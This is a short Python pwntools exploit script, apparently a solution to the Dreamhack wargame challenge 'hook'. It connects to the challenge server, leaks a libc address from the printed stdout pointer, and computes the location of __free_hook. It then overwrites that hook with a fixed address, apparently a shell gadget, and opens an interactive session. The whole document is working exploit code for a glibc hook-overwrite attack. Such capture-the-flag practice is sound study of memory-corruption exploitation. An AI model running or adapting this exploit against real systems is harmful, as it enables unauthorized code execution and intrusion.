from pwn import *

p = remote('host3.dreamhack.games', 16502)
e = ELF('./hook')
libc = ELF('./libc-2.23.so')

p.recvuntil(b'stdout: ')
stdout = int(p.recvline()[:-1], 16)
lb = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = lb + libc.symbols['__free_hook']

p.sendlineafter(b'Size: ', b'16')

payload = p64(free_hook) + p64(0x400a11)
p.sendafter(b'Data', payload)

p.interactive()